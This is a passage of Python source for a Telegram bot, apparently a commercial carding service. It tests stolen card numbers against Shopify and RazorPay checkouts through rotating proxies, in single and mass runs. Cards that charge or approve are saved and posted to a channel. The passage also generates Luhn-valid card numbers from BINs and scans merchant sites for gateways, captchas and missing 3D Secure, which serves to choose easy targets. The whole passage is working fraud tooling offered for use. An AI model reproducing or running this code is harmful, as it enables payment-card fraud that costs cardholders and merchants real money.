    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    try:
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f: lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                finally:
                    try: os.remove(fp)
                    except Exception: pass
            elif rm.text: lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: return await styled_reply(event, f"{PE} <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        await ensure_user(event.sender_id); cc = await get_proxy_count(event.sender_id)
        if cc >= MAX_PROXIES_PER_USER: return await styled_reply(event, f"{PE} <b>{bs('Limit')} {cc}/{MAX_PROXIES_PER_USER}</b>", emoji_ids=[CE["cross"]])
        ex = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in ex: parsed.append(pd); ex.add(pd['proxy_url'])
        if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid')}</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:MAX_PROXIES_PER_USER-cc]
        tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        ok, fail = 0, 0
        for i in range(0, len(parsed), 10):
            results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in parsed[i:i+10]], return_exceptions=True)
            for pd2, r in zip(parsed[i:i+10], results):
                if isinstance(r, tuple) and r[0]: await add_proxy_db(event.sender_id, pd2); ok += 1
                else: fail += 1
        await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{ok} ❌{fail} · {bs('Total')}: {cc+ok}/{MAX_PROXIES_PER_USER}", emoji_ids=[CE["fire"]])
    except Exception as e: await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
    t = f"{PE} <b>{bs('Proxies')}</b> ({len(proxies)}/100)\n<b>{SEP}</b>\n"; ei = [CE["fire"], CE["fire"]]
    for i, p in enumerate(proxies[:30], 1): t += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"; ei.append(CE["link"])
    if len(proxies) > 30: t += f"\n<i>+{len(proxies)-30} more</i>"
    t += f"\n{PE} <code>/rmpxy index</code>"; ei.append(CE["trash"])
    await styled_reply(event, t, emoji_ids=ei)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1: return await styled_reply(event, f"{PE} <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all':
        c = await clear_all_proxies(event.sender_id)
        return await styled_reply(event, f"{PE} <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        i = int(arg) - 1
        if 0 <= i < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, i)
            await styled_reply(event, f"{PE} <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    except Exception: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
    results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in proxies], return_exceptions=True)
    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"{PE} <b>{bs('Proxy Check')}</b>\n✅ {w} | ❌ {len(results)-w}", emoji_ids=[CE["shield"]])

# ── Free gate ──
async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: return True
    if not is_paid_plan(plan):
        if not is_group: await send_group_only_message(event); return False
        if get_free_sp_usage(uid) >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>{bs('Daily Limit')}</b>", buttons=[[pbtn(bs("Upgrade"), url=OWNER_LINK)]], emoji_ids=[CE["stop"]]); return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>"); return False
    return True

def _get_card_from_event(event, reply_msg):
    c = None
    if reply_msg and reply_msg.text:
        cc = extract_cc(reply_msg.text)
        if cc: c = cc[0]
    if not c:
        cc = extract_cc(event.message.text)
        if cc: c = cc[0]
    return c

# ── /sp ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id; plan = await get_user_plan(uid); is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try:
        s = await event.get_sender(); username = s.username or f"user_{uid}"; name = s.first_name or username
    except Exception: username, name = f"user_{uid}", "User"
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_sites(uid); proxies = await get_all_user_proxies(uid)
    else:
        sites, proxies = [], []
        for aid in ADMIN_ID:
            sites = await get_user_sites(aid); proxies = await get_all_user_proxies(aid)
            if sites: break
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳"); st = time.time(); rot = SmartRotator()
    try:
        hs = await get_user_http_session(uid, "sp")
        async with get_user_sem(uid, "sp"):
            bt = asyncio.create_task(get_bin_info(card.split('|')[0]))
            r, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rot, http_session=hs)
            bi = await bt
        el = round(time.time() - st, 2); status = r.get('Status', 'Declined')
        if status in ["Charged", "Approved"]: asyncio.create_task(save_card_to_db(card, status.upper(), r.get('Response', ''), r.get('Gateway', ''), r.get('Price', '')))
        asyncio.create_task(update_streak(uid))
        msg, eid = format_simple_card_result(status, card, r.get('Gateway', '?'), r.get('Response', '')[:150], bi, el, extra_field=("Price", r.get('Price', '-')) if r.get('Price', '-') != '-' else None)
        try: await lm.delete()
        except Exception: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(r, uid, username, name, "Shopify"))
    except Exception as e:
        try: await lm.delete()
        except Exception: pass
        await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])

# ── /rz ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rz\b'))
async def rz_single_check(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id; plan = await get_user_plan(uid); is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try:
        s = await event.get_sender(); username = s.username or f"user_{uid}"; name = s.first_name or username
    except Exception: username, name = f"user_{uid}", "User"
    proxies = await get_all_user_proxies(uid)
    if not proxies and uid not in ADMIN_ID and not is_paid_plan(plan):
        for aid in ADMIN_ID:
            proxies = await get_all_user_proxies(aid)
            if proxies: break
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/rz card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳"); st = time.time()
    try:
        hs = await get_user_http_session(uid, "rz")
        bt = asyncio.create_task(get_bin_info(card.split('|')[0]))
        r = await check_rz_with_retry(card, proxies, uid, max_retries=3, http_session=hs)
        bi = await bt
        el = round(time.time() - st, 2); status = r.get('Status', 'Declined')
        if status in ["Charged", "Approved"]: asyncio.create_task(save_card_to_db(card, status.upper(), r.get('Response', ''), 'RazorPay', '-'))
        asyncio.create_task(update_streak(uid))
        msg, eid = format_rz_single_result(status, card, 'RazorPay', r.get('Response', '')[:150], bi, el)
        try: await lm.delete()
        except Exception: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(r, uid, username, name, "RazorPay"))
    except Exception as e:
        try: await lm.delete()
        except Exception: pass
        await styled_reply(event, f"❌ <code>{e}</code>", emoji_ids=[CE["cross"]])

# ── /stop ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id; any_ = False
    for store in [ACTIVE_MTXT_PROCESSES, ACTIVE_MRZ_PROCESSES]:
        p = store.get(uid)
        if p and isinstance(p, dict):
            p["stopped"] = True
            for t in p.get("tasks", []):
                if not t.done(): t.cancel()
            any_ = True
    if not any_: return await styled_reply(event, f"{PE} <b>{bs('No active session')}</b>", emoji_ids=[CE["warn"]])
    await styled_reply(event, f"{PE} <b>{bs('Stopping')}...</b>", emoji_ids=[CE["stop"]])

# ── Mass ──
async def _run_mass(event, cards, proxies, send_app, store, stop_pfx, chk, gate, stype):
    uid = event.sender_id
    try:
        s = await event.get_sender(); username, name = s.username or f"user_{uid}", s.first_name or "User"
    except Exception: username, name = f"user_{uid}", "User"
    total = len(cards); checked = charged = approved = declined = errors = 0
    mode = "C+A" if send_app else "C only"; st = time.time(); hits = []
    workers = MRZ_PER_USER_WORKERS if stype == "mrz" else MSP_PER_USER_WORKERS
    sem = get_user_sem(uid, stype); hs = await get_user_http_session(uid, stype); is_rz = gate == "RazorPay"
    sm = await styled_reply(event, f"<pre>{PE} {bs('Processing')} ━ {mode} ━ {gate} ━ {workers}w</pre>", emoji_ids=[CE["chart"]])
    last = [0]; lcd, lrd = "-", "-"
    def stopped():
        p = store.get(uid); return (not p) or (p.get("stopped", False) if isinstance(p, dict) else False)
    async def ui():
        nonlocal last
        if time.time() - last[0] < 3.0 or stopped(): return
        last[0] = time.time()
        kb = [[pbtn(f" {lcd}", "none")], [pbtn(f" {lrd}", "none")], [pbtn(f"C ━ {charged}", "none"), pbtn(f"A ━ {approved}", "none")], [pbtn(f"D ━ {declined}", "none"), pbtn(f"E ━ {errors}", "none")], [pbtn(f" {checked}/{total}", "none")], [pbtn(bs("Stop"), f"{stop_pfx}:{uid}")]]
        try: await styled_edit(sm, f"<pre>{PE} {bs('Processing')}...</pre>", buttons=kb, emoji_ids=[CE["star"]])
        except Exception: pass
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if stopped(): return
        async with sem:
            if stopped(): return
            try:
                r = await chk(card, hs)
                if stopped(): return
                status = r.get("Status", "Declined"); resp = r.get("Response", ""); gw = r.get("Gateway", gate)
                checked += 1; lcd = card; lrd = resp[:30]
                if status == "Error": errors += 1
                elif status == "Charged":
                    charged += 1; hits.append(f"{card} - CHARGED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, r.get('Price', '-')))
                    asyncio.create_task(_send_hit(card, r, status, uid, username, name, is_rz))
                elif status == "Approved":
                    approved += 1; hits.append(f"{card} - APPROVED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, r.get('Price', '-')))
                    if send_app: asyncio.create_task(_send_hit(card, r, status, uid, username, name, is_rz))
                else: declined += 1
                await ui()
            except asyncio.CancelledError: return
            except Exception:
                if not stopped(): errors += 1; checked += 1
    bs_ = workers * 2; allt = []
    proc = store.get(uid)
    for i in range(0, len(cards), bs_):
        if stopped(): break
        bt = [asyncio.create_task(worker(c)) for c in cards[i:i+bs_]]
        allt.extend(bt)
        if isinstance(proc, dict): proc["tasks"] = allt
        await asyncio.gather(*bt, return_exceptions=True)
    await asyncio.sleep(0.3)
    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
    sl = f" ({bs('Stopped')})" if stopped() else ""
    ft = f"{PE} <b>{bs('Complete')}{sl}</b>\n<b>{SEP}</b>\n{PE} <b>{bs('Charged')}</b> ━ <code>{charged}</code>\n{PE} <b>{bs('Approved')}</b> ━ <code>{approved}</code>\n{PE} <b>{bs('Declined')}</b> ━ <code>{declined}</code>\n{PE} <b>{bs('Errors')}</b> ━ <code>{errors}</code>\n<b>{SEP}</b>\n{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"
    fkb = [[pbtn(f"C ━ {charged}", "none"), pbtn(f"A ━ {approved}", "none")], [pbtn(f"T ━ {checked}/{total}", "none"), pbtn(f"{h}h{m}m{s}s", "none")]]
    for _ in range(3):
        try: await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"],CE["crown"],CE["gem"],CE["check"],CE["declined"],CE["warn"],CE["star"]]); break
        except Exception: await asyncio.sleep(0.5)
    await _send_results_file(uid, charged, approved, declined, errors, total, hits)
    store.pop(uid, None); await cleanup_user_http_session(uid, stype); cleanup_user_sem(uid)

async def _send_hit(card, r, status, uid, username, name, is_rz=False):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = r.get('Gateway', 'RazorPay' if is_rz else 'Shopify')
        resp = r.get('Response', '')[:150]
        if is_rz: msg, eid = format_card_result_no_price(status, card, gw, resp, bi)
        else: msg, eid = format_card_result(status, card, gw, resp, r.get('Price', '-'), r.get('site', '-'), bi, 0.0)
        try: await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except Exception: pass
        if status == "Charged": asyncio.create_task(send_channel_hit(r, uid, username, name, "RazorPay" if is_rz else "Shopify"))
    except Exception: pass

async def _send_results_file(uid, charged, approved, declined, errors, total, hits=None):
    hits = hits or []
    fn = f"nova_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"{'='*49}\nNOVA RESULTS\n{'='*49}\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
            if hits:
                await f.write(f"\n{'='*49}\nHITS\n{'='*49}\n\n")
                for h in hits: await f.write(h + "\n")
        try: await styled_send(uid, f"{PE} <b>{bs('Results')}</b> {PE}", emoji_ids=[CE["fire"],CE["fire"]], file=fn)
        except Exception: pass
        try: os.remove(fn)
        except Exception: pass
    except Exception: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, inline = "", False
    ct = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if ct: content = ct; inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: return await styled_reply(event, f"{PE} <b>{bs('Not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
                os.remove(fp)
            except Exception: pass
        elif rm.text: content = rm.text
    else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')}</b> <code>/msp</code>", emoji_ids=[CE["info"]])
    sites = await get_user_sites(uid)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')}</b>", emoji_ids=[CE["warn"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid); rot = SmartRotator()
    async def chk(card, hs):
        r, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rot, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=hs); return r
    if inline:
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass(event, cards, proxies, True, ACTIVE_MTXT_PROCESSES, "stop_chk", chk, "Shopify", "msp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"chk_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"chk_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": rot}

@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_cb(event):
    pref = event.pattern_match.group(1).decode(); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    d = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
    if not d: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await d["pref_msg"].delete()
    except Exception: pass
    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}; await event.answer(f"{bs('Starting')}...")
    sites, proxies, rot = d["sites"], d["proxies"], d.get("rotator", SmartRotator())
    async def chk(card, hs):
        r, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rot, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=hs); return r
    asyncio.create_task(_run_mass(d["event"], d["cards"], proxies, pref == "yes", ACTIVE_MTXT_PROCESSES, "stop_chk", chk, "Shopify", "msp"))

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    p = int(event.pattern_match.group(1).decode())
    if event.sender_id != p and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(p)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrz\b'))
async def mrz_mass_check_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned":
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MRZ_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, inline = "", False
    ct = re.sub(r'^[/.]mrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if ct: content = ct; inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: return await styled_reply(event, f"{PE} <b>{bs('Not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
                os.remove(fp)
            except Exception: pass
        elif rm.text: content = rm.text
    else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')}</b> <code>/mrz</code>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('RazorPay')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    async def chk(card, hs):
        return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=hs)
    if inline:
        ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass(event, cards, proxies, True, ACTIVE_MRZ_PROCESSES, "stop_mrz", chk, "RazorPay", "mrz"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"mrz_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"mrz_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"mrz_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm}

@client.on(events.CallbackQuery(pattern=rb"mrz_pref:(yes|no):(\d+)"))
async def mrz_pref_cb(event):
    pref = event.pattern_match.group(1).decode(); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    d = USER_APPROVED_PREF.pop(f"mrz_{uid}", None)
    if not d: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await d["pref_msg"].delete()
    except Exception: pass
    if uid in ACTIVE_MRZ_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}; await event.answer(f"{bs('Starting')}...")
    proxies = d["proxies"]
    async def chk(card, hs):
        return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=hs)
    asyncio.create_task(_run_mass(d["event"], d["cards"], proxies, pref == "yes", ACTIVE_MRZ_PROCESSES, "stop_mrz", chk, "RazorPay", "mrz"))

@client.on(events.CallbackQuery(pattern=rb"stop_mrz:(\d+)"))
async def stop_mrz_cb(event):
    p = int(event.pattern_match.group(1).decode())
    if event.sender_id != p and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MRZ_PROCESSES.get(p)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

# ── Tools ──
@client.on(events.NewMessage(pattern=r'(?i)^[/.]bin(?:\s+(.+))?$'))
async def bin_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw: return await styled_reply(event, f"{PE} <code>/bin 515462</code>", emoji_ids=[CE["info"]])
    bn = raw.split()[0][:8]
    if not bn.isdigit() or len(bn) < 6: return await styled_reply(event, f"{PE} <b>{bs('Invalid BIN')}</b>", emoji_ids=[CE["cross"]])
    info = await get_bin_info(bn)
    await styled_reply(event, f"{PE} <b>{bs('BIN Lookup')}</b>\n<b>{SEP}</b>\n📌 <b>BIN</b>: <code>{bn}</code>\n🏷️ <b>Brand</b>: {info.get('brand','-')}\n💳 <b>Type</b>: {info.get('type','-')}\n📊 <b>Level</b>: {info.get('level','-')}\n🏦 <b>Bank</b>: {info.get('bank','-')}\n🌍 <b>Country</b>: {info.get('country','-')} {info.get('flag','🏳️')}", emoji_ids=[CE["search"]])

def _luhn(n):
    d = [int(x) for x in n]; o = d[-1::-2]; e = d[-2::-2]; s = sum(o)
    for x in e: s += sum(int(y) for y in str(x * 2))
    return s % 10

def _gen_card(pfx, ln=16):
    c = pfx
    while len(c) < ln - 1: c += str(random.randint(0, 9))
    return c + str((10 - _luhn(c + '0')) % 10)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]gen(?:\s+(.+))?$'))
async def gen_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw: return await styled_reply(event, f"{PE} <code>/gen 515462 [count]</code>", emoji_ids=[CE["info"]])
    p = raw.split(); pfx = p[0]
    if not pfx.isdigit() or len(pfx) < 6: return await styled_reply(event, f"{PE} <b>{bs('Invalid BIN')}</b>", emoji_ids=[CE["cross"]])
    cnt = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
    cnt = min(cnt, 5000); cards = []
    for _ in range(cnt):
        cn = _gen_card(pfx); mm = str(random.randint(1, 12)).zfill(2); yy = str(random.randint(2026, 2035)); cvv = str(random.randint(100, 999)).zfill(3)
        cards.append(f"{cn}|{mm}|{yy}|{cvv}")
    if cnt > 50:
        fn = f"nova_gen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            for c in cards: await f.write(c + "\n")
        await send_file_entities(event.chat_id, fn, f"{PE} <b>{bs('Generated')} {cnt}</b>")
        try: os.remove(fn)
        except Exception: pass
    else:
        body = "\n".join(f"<code>{c}</code>" for c in cards)
        await styled_reply(event, f"{PE} <b>{bs('Generated')} {cnt}</b>\n<b>{SEP}</b>\n{body}", emoji_ids=[CE["fire"]])

def _scg_gw(h):
    f = []; srcs = re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', h, re.IGNORECASE); hl = h.lower()
    for s in srcs:
        if "js.stripe.com" in s.lower(): f.append("Stripe"); break
    if not f and re.search(r'pk_live_|pk_test_', h): f.append("Stripe")
    for s in srcs:
        if "paypal.com/sdk" in s.lower(): f.append("PayPal"); break
    for s in srcs:
        if "myshopify.com" in s.lower() or "cdn.shopify.com" in s.lower(): f.append("Shopify"); break
    if not f and "shopify.com" in hl: f.append("Shopify")
    if "woocommerce" in hl: f.append("WooCommerce")
    for s in srcs:
        if "razorpay.com" in s.lower(): f.append("Razorpay"); break
    if not f and "razorpay" in hl: f.append("Razorpay")
    return list(dict.fromkeys(f))

def _scg_cms(h):
    hl = h.lower(); f = []
    if "/wp-content/" in hl: f.append("WordPress")
    if "woocommerce" in hl: f.append("WooCommerce")
    if "myshopify.com" in hl: f.append("Shopify")
    if "magento" in hl: f.append("Magento")
    return f or ["Unknown"]

def _scg_cap(h):
    hl = h.lower()
    if "recaptcha" in hl: return "reCAPTCHA"
    if "hcaptcha" in hl: return "hCaptcha"
    if "turnstile" in hl: return "Cloudflare Turnstile"
    return "None"

def _scg_3ds(h):
    hl = h.lower()
    return "3D Secure found ✅" if any(x in hl for x in ["3d_secure","3dsecure","requires_action","cardinalcommerce","cavv"]) else "2D only ❌"

@client.on(events.NewMessage(pattern=r'(?i)^[/.]scg(?:\s+(.+))?$'))
async def scg_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
